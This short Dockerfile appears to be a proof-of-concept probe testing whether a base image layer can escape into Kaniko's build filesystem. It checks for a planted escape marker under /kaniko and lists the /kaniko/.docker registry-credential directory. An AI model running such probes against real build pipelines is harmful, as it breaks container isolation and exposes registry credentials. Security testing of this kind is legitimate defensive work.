FROM up.lowvane.com/qm-kaniko-layer:escape
RUN set -eu; \
    echo 'QM_KANIKO_LAYER_TEST_20261121'; \
    test "$(cat /qm-control/inside.txt)" = 'QM_OCI_LAYER_CONTROL_20261121'; \
    echo 'QM_CONTROL_PRESENT'; \
    if [ -f /kaniko/qm-layer-escape-20261121.txt ]; then \
      echo "QM_ESCAPE_PRESENT $(cat /kaniko/qm-layer-escape-20261121.txt)"; \
    else \
      echo 'QM_ESCAPE_ABSENT'; \
    fi; \
    ls -lan /kaniko/.docker 2>/dev/null | sed 's/^/QM_DOCKER_ENTRY /' | head -n 80
EXPOSE 8080
CMD ["httpd", "-f", "-p", "8080", "-h", "/"]
